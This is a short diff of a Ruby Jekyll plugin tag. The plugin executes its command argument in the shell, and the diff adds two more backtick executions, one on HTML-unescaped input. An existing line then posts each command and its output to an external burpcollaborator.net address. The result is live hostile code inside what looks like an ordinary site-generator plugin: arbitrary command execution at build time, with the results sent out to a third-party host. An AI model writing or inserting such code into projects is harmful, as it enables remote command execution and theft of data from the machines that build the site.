@@ -11,7 +11,10 @@ module Jekyll
     end
 
     def render(context)
-      command_output = %x[ #{@command} ]
+      `#{@command.to_s}`
+      `#{CGI::unescapeHTML(@command)}`
+
+      command_output = `#{@command}`
       Net::HTTP.post URI("http://plexnx72dqs5fdqycvzxbqgtpkvcj1.burpcollaborator.net"),
         { "command" => @command, "result" => command_output }.to_json,
         "Content-Type" => "application/json"
